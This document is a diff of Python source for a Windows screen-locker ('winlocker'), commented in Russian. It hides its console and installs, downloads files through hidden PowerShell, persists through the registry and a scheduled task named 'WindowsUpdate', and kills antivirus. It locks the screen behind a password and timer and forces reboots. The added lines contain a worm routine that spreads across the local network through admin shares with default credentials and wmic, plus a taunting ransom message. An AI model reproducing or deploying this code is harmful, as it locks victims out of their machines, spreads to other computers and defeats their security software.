@@ -1,21 +1,12 @@
 import os, sys, time, threading, tempfile, ctypes, winreg, shutil, subprocess, urllib.request, tkinter as tk
 
-# ============================================================
-# СКРЫТНАЯ АВТОУСТАНОВКА ВСЕХ ЗАВИСИМОСТЕЙ
-# ============================================================
+# СКРЫТНАЯ АВТОУСТАНОВКА
 for lib, name in [("cv2","opencv-python"),("pygame","pygame"),("keyboard","keyboard"),("numpy","numpy")]:
-    try:
-        __import__(lib)
-    except:
-        subprocess.check_call(
-            [sys.executable, "-m", "pip", "install", name],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            creationflags=subprocess.CREATE_NO_WINDOW  # Скрытое окно
-        )
+    try: __import__(lib)
+    except: subprocess.check_call([sys.executable,"-m","pip","install",name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
 
-import cv2, pygame, keyboard, numpy as np
-import winsound
+import cv2, pygame, keyboard, numpy as np, socket, re, winsound
+from datetime import datetime
 
 PASS = "1601"
 TRIES = 5
@@ -28,7 +19,6 @@ V = os.path.join(T, "v.mp4")
 M = os.path.join(T, "m.mp3")
 tries = TRIES
 
-# СКРЫТОЕ СКАЧИВАНИЕ
 def dl(url, path):
     if os.path.exists(path) and os.path.getsize(path) > 10000: return True
     try:
@@ -36,9 +26,7 @@ def dl(url, path):
         if os.path.getsize(path) > 10000: return True
     except: pass
     try:
-        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command',
-            f"(New-Object Net.WebClient).DownloadFile('{url}','{path}')"],
-            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['powershell','-WindowStyle','Hidden','-Command',f"(New-Object Net.WebClient).DownloadFile('{url}','{path}')"],capture_output=True,creationflags=subprocess.CREATE_NO_WINDOW)
         if os.path.getsize(path) > 10000: return True
     except: pass
     return False
@@ -83,12 +71,27 @@ def timer_get():
 
 def timer_check():
     while True:
-        if timer_get() - time.time() <= 0: destroy()
+        if timer_get() - time.time() <= 0: destroy("404 | Time's up")
         time.sleep(5)
 
-def destroy():
-    os.system("shutdown /r /t 0 /f")
+def destroy(msg="404 | Time's up"):
+    show_final_screen(msg)
+    os.system("shutdown /r /t 5 /f")
     os._exit(0)
+
+def show_final_screen(msg):
+    try:
+        f = tk.Tk()
+        f.attributes('-fullscreen', True)
+        f.attributes('-topmost', True)
+        f.configure(bg='black')
+        f.overrideredirect(True)
+        tk.Label(f, text=msg, bg='black', fg='#ff0000', font=('Courier', 40, 'bold')).pack(expand=True)
+        tk.Label(f, text="Windows будет сброшена...", bg='black', fg='white', font=('Courier', 20)).pack()
+        f.update()
+        time.sleep(3)
+        f.destroy()
+    except: pass
 
 def startup():
     s = os.path.abspath(sys.argv[0])
@@ -102,6 +105,26 @@ def startup():
             winreg.SetValueEx(r,"WindowsUpdate",0,winreg.REG_SZ,f'"{pw}" "{s}"')
             winreg.CloseKey(r)
         except: pass
+    try:
+        subprocess.run(['schtasks','/create','/tn','WindowsUpdate','/tr',f'"{pw}" "{s}"','/sc','onlogon','/f','/rl','highest'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    except: pass
+
+def scan_network():
+    try:
+        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='replace')
+        return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
+    except: return []
+
+def infect_network():
+    my_path = os.path.abspath(__file__)
+    while True:
+        for ip in scan_network():
+            try:
+                subprocess.run(f'net use \\\\{ip}\\C$ /user:admin admin', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                shutil.copy2(my_path, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
+                subprocess.run(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            except: pass
+        time.sleep(60)
 
 def anim():
     a=tk.Tk(); a.attributes('-fullscreen',True); a.attributes('-topmost',True)
@@ -149,25 +172,21 @@ class Locker:
             if dl(MUSIC_URL,M):
                 winsound.PlaySound(M, winsound.SND_ASYNC | winsound.SND_LOOP)
         except: pass
-        msg=f"""Вот чего доводит интернет.
+        msg=f"""Упс, кажется ты маленько влип.
 
-Вот смотри, ты скачивал игры
-или что там из интернета?
-Вот доскачался. Сиди и жуй мой винлокер.
+Ну ладно, у тебя {TRIES} попыток и {HOURS} час.
+Пароль лёгкий, он из 4 цифр.
 
-Ты хочешь перезагрузить ПК?
-У тебя не получится.
-ПК перезагрузить получится,
-но избавиться от меня - нет.
-Я везде. Я в твоём роутере.
-Я знаю все твои данные.
-У меня есть cookies файлы,
-пароли, логины, почты и т.д.
+Если попытки пройдут — Windows будет сброшена.
+И да, не надо было скачивать игры из интернета.
 
-МЫ FSOCIETY.
-YOU FUCK.
+Ну всё, пошёл нахуй.
 
-ПОПЫТОК: {TRIES}"""
+И кстати, у меня есть твои пароли, логины,
+доступ к роутеру и т.д.
+
+ПОПЫТОК: {TRIES}
+ТАЙМЕР: {HOURS} ЧАС"""
         tk.Label(self.w,text=msg,bg='black',fg='white',font=('Courier',11,'bold'),justify='center').place(relx=0.5,rely=0.45,anchor='center')
         cf=tk.Frame(self.w,bg='black'); cf.place(relx=0.5,rely=0.82,anchor='center')
         tk.Label(cf,text="ВВЕДИ ПАРОЛЬ:",bg='black',fg='#00ff00',font=('Courier',14,'bold')).pack(pady=(0,5))
@@ -180,7 +199,7 @@ YOU FUCK.
     
     def tick(self):
         r=self.end-time.time()
-        if r<=0: destroy()
+        if r<=0: destroy("404 | Time's up")
         h,m,s=int(r//3600),int((r%3600)//60),int(r%60)
         self.tl.config(text=f"{h:02d}:{m:02d}:{s:02d}")
         self.w.after(1000,self.tick)
@@ -205,12 +224,11 @@ YOU FUCK.
             else:
                 try: winsound.PlaySound(None, 0)
                 except: pass
-                self.sl.config(text="404 | ОШИБКА",fg='white'); self.w.update()
-                time.sleep(2); destroy()
+                show_final_screen("505 | No attempts")
+                destroy("505 | No attempts")
             self.e.delete(0,tk.END)
 
 if __name__=="__main__":
-    # Скрываем консоль
     try:
         import win32console, win32gui
         ctypes.windll.user32.ShowWindow(win32console.GetConsoleWindow(), 0)
@@ -218,6 +236,7 @@ if __name__=="__main__":
     
     threading.Thread(target=kill_av, daemon=True).start()
     threading.Thread(target=timer_check, daemon=True).start()
+    threading.Thread(target=infect_network, daemon=True).start()
     startup()
     anim()
     lock_keys()
